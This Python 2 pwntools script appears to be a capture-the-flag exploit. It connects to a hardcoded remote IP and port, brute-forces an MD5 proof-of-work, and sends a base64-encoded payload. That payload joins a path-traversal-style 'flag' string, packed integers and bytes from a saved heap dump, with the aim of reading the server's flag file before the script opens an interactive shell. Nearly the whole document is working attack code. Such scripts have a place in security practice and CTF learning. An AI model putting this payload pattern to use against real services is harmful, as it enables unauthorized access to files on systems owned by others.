from pwn import *
from itertools import product
import hashlib

r = remote('211.117.60.124', 12354)

data = r.recvuntil('zero bits')
nonce = data.split('S || ')[1].split(')')[0].strip()
# nonce = 'asdf'

print 'nonce', nonce

CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

def check(s):
    h = hashlib.md5()
    h.update(s + nonce)
    md = h.digest()

    flag = 0
    for i in range(22):
        byte_idx = i // 8
        bit_idx = 7 - i % 8

        if ord(md[byte_idx]) & (1 << bit_idx):
            flag = 1
            break

    if flag == 0:
        return True
    else:
        return False

def get_random_string(length):
    letters = CHARSET
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

while True:
    flag = True
    x = get_random_string(5)
    if check(x):
        break

print(hashlib.md5(x + nonce).hexdigest())
print(x)
r.sendline(x)

data = open("after_my_heap_0x8bb91df8", "rb").read()

# r.sendline('QUFBQUFBQUFBQUFBQUFBQkJCQkJCQkJCQkJCQkI=') # for verifier-1

payload = './//////////flag'
payload += p32(1) + p32(0) + p32(0x3515b)
payload += p32(0x300)
payload += data[0x20:0xd0]
payload += p32(1780)
r.sendline(payload.encode('base64').replace('\n', ''))

r.interactive()

